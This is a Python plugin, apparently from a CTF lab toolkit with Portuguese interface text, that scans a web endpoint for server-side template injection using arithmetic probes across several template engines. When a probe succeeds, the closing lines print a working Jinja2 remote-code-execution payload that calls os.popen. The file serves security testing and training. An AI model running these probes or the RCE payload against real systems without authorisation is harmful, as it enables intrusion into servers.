"""
plugins/ssti.py — plugin: Server-Side Template Injection scanner.
"""

from __future__ import annotations

from rich.console import Console

from ctflab.core import http as H, payloads as P
from ctflab.core.session import Session
from ctflab.cli.ui import ask, askctx, scan_table

PLUGIN_NAME = "SSTI Scanner"
PLUGIN_DESC = "Detecta Server-Side Template Injection via probes matemáticos"

# probe → (resultado esperado, engine candidata)
_MATH_PROBES: dict[str, tuple[str, str]] = {
    "{{7*7}}":        ("49",      "Jinja2 / Twig"),
    "${7*7}":         ("49",      "Mako / Freemarker / EL"),
    "#{7*7}":         ("49",      "Thymeleaf / Ruby ERB"),
    "<%= 7*7 %>":     ("49",      "ERB / EJS"),
    "@(7*7)":         ("49",      "Razor (.NET)"),
    "{{7*'7'}}":      ("7777777", "Jinja2 (string mul)"),
    "${{'a':'b'}.class}": ("class", "Freemarker object"),
}


def run(session: Session, console: Console) -> None:
    console.rule("[head]SSTI SCANNER (plugin)[/head]")
    console.print("[dim]Testa execução de template via probes matemáticos 7*7=49.[/dim]\n")

    path  = askctx(session, "path",  "path",       "/render")
    param = askctx(session, "param", "parâmetro",  "template")
    mode  = ask("modo (json/get)", "json")

    table = scan_table(
        "SSTI — probes",
        ["probe", "esperado", "encontrado?", "engine"],
    )

    hits = 0
    with H._make_client(session) as cl:
        for probe, (expected, engine_hint) in _MATH_PROBES.items():
            try:
                if mode == "get":
                    r = cl.get(path, params={param: probe})
                else:
                    r = cl.post(path, json={param: probe})

                found    = expected in r.text
                hit_str  = "[ok]sim[/ok]" if found else "[fail]não[/fail]"
                engine   = engine_hint if found else ""

                if found:
                    hits += 1
                    session.note(f"SSTI: {probe} → {expected} ({engine})")

            except Exception as exc:
                hit_str, engine = f"[fail]{exc}[/fail]", ""

            table.add_row(probe[:35], expected, hit_str, engine)

    console.print(table)
    if hits:
        console.print(f"\n[ok]{hits} probe(s) com execução detectada![/ok]")
        console.print(
            "[dim]próximo passo: testar RCE com {{config.__class__.__init__.__globals__['os'].popen('id').read()}}[/dim]"
        )
    else:
        console.print("\n[fail]nenhum SSTI detectado[/fail]")
